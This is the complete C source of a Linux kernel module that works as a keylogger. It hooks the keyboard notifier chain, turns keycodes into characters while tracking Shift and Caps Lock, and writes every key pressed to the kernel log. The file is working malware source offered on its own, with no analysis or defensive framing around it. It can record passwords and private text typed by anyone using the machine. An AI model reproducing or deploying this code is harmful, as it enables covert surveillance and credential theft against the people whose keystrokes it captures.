#include <linux/module.h>	
#include <linux/kernel.h>	
#include <linux/init.h>		
#include <linux/keyboard.h>     
#include <linux/semaphore.h>  
int keyLog(struct notifier_block *nb, unsigned long code, void *_param);
static struct notifier_block nb;
struct semaphore sem;
struct semaphore sem1;
static int shiftKeyDepressed = 0;
static int capsLockDepressed = 0;

static const char* keymap[] = { "\0", "ESC", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "_BACKSPACE_", "_TAB_",
                        "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "_ENTER_", "_CTRL_", "a", "s", "d", "f",
                        "g", "h", "j", "k", "l", ";", "'", "`", "_SHIFT_", "\\", "z", "x", "c", "v", "b", "n", "m", ",", ".",
                        "/", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
"\0", "\0", "\0", "\0", "\0", "_PAUSE_"};


static const char* keymapShiftActivated[] =
                        { "\0", "ESC", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "_BACKSPACE_", "_TAB_",
                        "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "_ENTER_", "_CTRL_", "A", "S", "D", "F",
                        "G", "H", "J", "K", "L", ":", "\"", "~", "_SHIFT_", "|", "Z", "X", "C", "V", "B", "N", "M", "<", ">",
                        "?", "_SHIFT_", "\0", "\0", " ", "_CAPSLOCK_", "_F1_", "_F2_", "_F3_", "_F4_", "_F5_", "_F6_", "_F7_",
                        "_F8_", "_F9_", "_F10_", "_NUMLOCK_", "_SCROLLLOCK_", "_HOME_", "_UP_", "_PGUP_", "-", "_LEFT_", "5",
                        "_RTARROW_", "+", "_END_", "_DOWN_", "_PGDN_", "_INS_", "_DEL_", "\0", "\0", "\0", "_F11_", "_F12_",
                        "\0", "\0", "\0", "\0", "\0", "\0", "\0", "_ENTER_", "CTRL_", "/", "_PRTSCR_", "ALT", "\0", "_HOME_",
                        "_UP_", "_PGUP_", "_LEFT_", "_RIGHT_", "_END_", "_DOWN_", "_PGDN_", "_INSERT_", "_DEL_", "\0", "\0",
"\0", "\0", "\0", "\0", "\0", "_PAUSE_"};

static int keyLog_init(void)
{
	register_keyboard_notifier(&nb);  // notifier_chain_register,     nb = notifier block
	sema_init(&sem, 1);
	sema_init(&sem1, 1);
	return 0;
}

static struct notifier_block nb =
{
	.notifier_call =  keyLog
};

int keyLog(struct notifier_block *nb, unsigned long code, void *_param)   //code = Event type, 
{
	struct keyboard_notifier_param *param = _param; 
  
 	
	if (code == KBD_KEYCODE)  // KBD_KEYCODE = 0x0001 /* Keyboard keycode, called before any other */
	{
    		if( param->value==42 || param->value==54 )
        	{
            		down(&sem);
            		if(param->down)
                		shiftKeyDepressed = 1;
            		else
                		shiftKeyDepressed = 0;
            		up(&sem);
            		return NOTIFY_OK;
        	}
			if(param->value==58 && param->down)
			{
				down(&sem1);
				capsLockDepressed = !capsLockDepressed;
				up(&sem1);
					
			}
				

        	if(param->down)
        	{
            		down(&sem);
					down(&sem1);
            		if((shiftKeyDepressed == 0 && capsLockDepressed==0)||(shiftKeyDepressed == 1 && capsLockDepressed==1))
                		printk(KERN_INFO "KL %s \n", keymap[param->value]);
            		else
					{
						if(capsLockDepressed==1)
						{
							if((param->value > 30 && param->value <38)||(param->value > 44 && param->value <50)||(param->value > 16 && param->value <25))
								printk(KERN_INFO "KL %s \n", keymapShiftActivated[param->value]);
							else
								printk(KERN_INFO "KL %s \n", keymap[param->value]);
						}
						else
							printk(KERN_INFO "KL %s \n", keymapShiftActivated[param->value]);
						
					}
            		up(&sem);
					up(&sem1);
			}
  	}  

	return NOTIFY_OK;
}

static void keyLog_cleanup(void)
{
	unregister_keyboard_notifier(&nb);
}

module_init(keyLog_init);
module_exit(keyLog_cleanup);
MODULE_LICENSE("GPL");


